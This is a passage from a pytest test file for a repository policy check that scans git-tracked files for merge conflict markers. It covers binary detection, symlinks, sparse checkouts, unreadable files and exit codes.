    assert policy.check_tracked_conflict_markers(repo) == 1


def test_the_tracked_scan_reads_the_worktree_not_the_index(
    tmp_path: Path,
) -> None:
    """CI checks out the head commit, so the worktree is the thing under test."""
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "clean\n")
    _write_file(repo, "doc.md", "<<<<<<< HEAD\nx\n>>>>>>> main\n")

    assert policy.check_tracked_conflict_markers(repo) == 1


def test_the_tracked_scan_ignores_untracked_files(tmp_path: Path) -> None:
    """A scratch file in someone's worktree is not what a PR is shipping."""
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "clean\n")
    _write_file(repo, "scratch.md", "<<<<<<< HEAD\nx\n>>>>>>> main\n")

    assert policy.check_tracked_conflict_markers(repo) == 0


def test_the_tracked_scan_allows_a_marker_inside_a_fence(tmp_path: Path) -> None:
    """merge-resolver documentation quotes markers on purpose."""
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(
        repo,
        "guide.md",
        "How to resolve:\n\n```\n<<<<<<< HEAD\nx\n>>>>>>> main\n```\n",
    )

    assert policy.check_tracked_conflict_markers(repo) == 0


def test_the_tracked_scan_skips_binary_files(tmp_path: Path) -> None:
    """Without the NUL sniff every tracked PNG gets decoded to look for text."""
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "clean\n")
    (repo / "blob.bin").write_bytes(b"\x00\x01<<<<<<< HEAD\nx\n>>>>>>> main\n")
    _git(repo, "add", "blob.bin")
    _git(repo, "commit", "-m", "add blob")

    assert policy.check_tracked_conflict_markers(repo) == 0


def test_the_tracked_scan_finds_a_marker_past_the_sniff_window(
    tmp_path: Path,
) -> None:
    """The binary sniff reads a head chunk; the rest of the file still counts.

    The scan reads ``_BINARY_SNIFF_BYTES`` first so a tracked PNG never lands
    in memory whole. That split is only safe while the text branch appends the
    remainder: dropping it would silently stop reporting every marker beyond
    the first 8 KB, and every existing case here sits inside that window.
    """
    repo = tmp_path / "repo"
    _init_repo(repo)
    padding = "filler line\n" * (policy._BINARY_SNIFF_BYTES // 6)
    assert len(padding.encode("utf-8")) > policy._BINARY_SNIFF_BYTES
    _commit_file(repo, "long.md", padding + "<<<<<<< HEAD\nx\n>>>>>>> main\n")

    assert policy.check_tracked_conflict_markers(repo) == 1


def test_the_tracked_scan_skips_a_binary_whose_nul_is_in_the_head(
    tmp_path: Path,
) -> None:
    """A large binary must be judged from the head chunk, not the whole file.

    Pairs with the test above: that one proves the remainder is still read for
    text, this one proves a binary is rejected before the remainder is touched,
    so neither half of the two-stage read can be removed unnoticed.
    """
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "clean\n")
    tail = b"<<<<<<< HEAD\nx\n>>>>>>> main\n"
    (repo / "big.bin").write_bytes(b"\x00" + b"\xff" * (policy._BINARY_SNIFF_BYTES * 4) + tail)
    _git(repo, "add", "big.bin")
    _git(repo, "commit", "-m", "add big blob")

    assert policy.check_tracked_conflict_markers(repo) == 0


def test_the_tracked_scan_reads_only_the_head_of_a_binary(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The point of the two-stage read is bytes, so measure bytes.

    Behaviour tests cannot see the difference: reading a binary whole and
    reading only its head both end in the same skip and the same exit code.
    Only a byte count distinguishes them, and the byte count is the whole
    reason the split exists. The 26 binaries tracked today are 26.4 MB, 26.8%
    of what this walk would otherwise read.
    """
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "clean\n")
    (repo / "big.bin").write_bytes(b"\x00" + b"\xff" * (policy._BINARY_SNIFF_BYTES * 16))
    _git(repo, "add", "big.bin")
    _git(repo, "commit", "-m", "add big blob")

    bytes_read: dict[str, int] = {}
    real_open = Path.open

    class _CountingHandle:
        def __init__(self, handle: Any, name: str) -> None:
            self._handle = handle
            self._name = name

        def __enter__(self) -> _CountingHandle:
            return self

        def __exit__(self, *exc: object) -> None:
            self._handle.close()

        def read(self, size: int = -1) -> bytes:
            data = self._handle.read(size)
            bytes_read[self._name] = bytes_read.get(self._name, 0) + len(data)
            return data

    def counting_open(self: Path, *args: Any, **kwargs: Any) -> Any:
        handle = real_open(self, *args, **kwargs)
        if self.name != "big.bin":
            return handle
        return _CountingHandle(handle, self.name)

    monkeypatch.setattr(Path, "open", counting_open)
    try:
        assert policy.check_tracked_conflict_markers(repo) == 0
    finally:
        monkeypatch.undo()

    assert bytes_read["big.bin"] <= policy._BINARY_SNIFF_BYTES, (
        f"read {bytes_read['big.bin']} bytes of a binary, expected at most "
        f"{policy._BINARY_SNIFF_BYTES}"
    )


def test_the_tracked_scan_honours_the_skipped_prefixes(tmp_path: Path) -> None:
    """tests/hooks/fixtures carries prohibited bytes on purpose."""
    repo = tmp_path / "repo"
    _init_repo(repo)
    fixture = "tests/hooks/fixtures/conflict.md"
    (repo / "tests" / "hooks" / "fixtures").mkdir(parents=True)
    (repo / fixture).write_text("<<<<<<< HEAD\nx\n>>>>>>> main\n", encoding="utf-8")
    _git(repo, "add", fixture)
    _git(repo, "commit", "-m", "add fixture")

    assert policy.check_tracked_conflict_markers(repo) == 0


def test_the_tracked_scan_does_not_follow_symlinks(tmp_path: Path) -> None:
    """The tracked object for a symlink is the link, not the target.

    Following the link would scan (or block on) whatever it points at,
    including paths outside the repo.
    """
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "tracked.txt", "clean\n")
    outside = tmp_path / "outside.txt"
    outside.write_text("<<<<<<< HEAD\nx\n>>>>>>> main\n", encoding="utf-8")
    link = repo / "link.txt"
    try:
        link.symlink_to(outside)
    except OSError:
        pytest.skip("filesystem does not support symlinks")
    _git(repo, "add", "link.txt")
    _git(repo, "commit", "-m", "add symlink")

    assert policy.check_tracked_conflict_markers(repo) == 0


def test_the_tracked_scan_skips_a_sparse_missing_file(tmp_path: Path) -> None:
    """A tracked path absent from the worktree is a checkout concern."""
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "tracked.txt", "clean\n")
    (repo / "tracked.txt").unlink()

    assert policy.check_tracked_conflict_markers(repo) == 0


@pytest.mark.skipif(os.name == "nt", reason="chmod 0 is a no-op on Windows")
def test_the_tracked_scan_fails_config_on_an_unreadable_file(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Silently continuing would report clean on a tree the scan never read."""
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "tracked.txt", "clean\n")
    (repo / "tracked.txt").chmod(0)
    try:
        assert policy.check_tracked_conflict_markers(repo) == 2
    finally:
        (repo / "tracked.txt").chmod(0o644)
    assert "could not read tracked file" in capsys.readouterr().err


def test_the_tracked_scan_survives_a_tracked_path_missing_from_disk(
    tmp_path: Path,
) -> None:
    """Sparse checkouts and submodules leave tracked paths absent."""
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "clean\n")
    (repo / "doc.md").unlink()

    assert policy.check_tracked_conflict_markers(repo) == 0


def test_the_tracked_scan_reports_every_offending_line(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "a.md", "<<<<<<< HEAD\nx\n>>>>>>> main\n")
    _commit_file(repo, "b.md", "y\n<<<<<<< HEAD\n")

    assert policy.check_tracked_conflict_markers(repo) == 1
    err = capsys.readouterr().err
    assert "a.md:1" in err
    assert "a.md:3" in err
    assert "b.md:2" in err


def test_the_tracked_scan_reports_a_git_failure_as_a_config_error(
    tmp_path: Path,
) -> None:
    """Exit 2 is the repo-is-unusable code; 1 means markers were found."""
    not_a_repo = tmp_path / "plain"
    not_a_repo.mkdir()

    assert policy.check_tracked_conflict_markers(not_a_repo) == 2
